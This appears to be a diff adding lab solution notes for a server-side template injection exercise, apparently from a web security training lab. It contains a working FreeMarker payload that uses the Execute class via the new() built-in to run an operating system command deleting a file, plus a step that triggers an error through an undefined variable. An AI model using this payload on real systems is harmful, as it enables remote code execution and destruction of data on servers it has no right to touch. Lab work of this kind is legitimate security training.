@@ -1,0 +1,5 @@
+// Trigger exception in edit template after logon as content-manager
+${kiddie}
+
+// Read Freemarker FAQ regarding new() built-in function
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
